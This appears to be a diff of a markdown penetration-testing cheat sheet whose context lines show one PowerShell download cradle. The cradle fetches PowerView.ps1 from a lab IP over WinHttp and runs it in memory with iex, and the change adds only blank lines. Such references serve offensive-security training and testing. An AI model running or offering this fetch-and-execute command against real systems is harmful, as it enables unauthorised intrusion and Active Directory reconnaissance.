@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:37:01.110401+00:00'
 ```bash
 $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.10/PowerView.ps1',$false);$h.send();iex $h.responseText
 ```
+
+
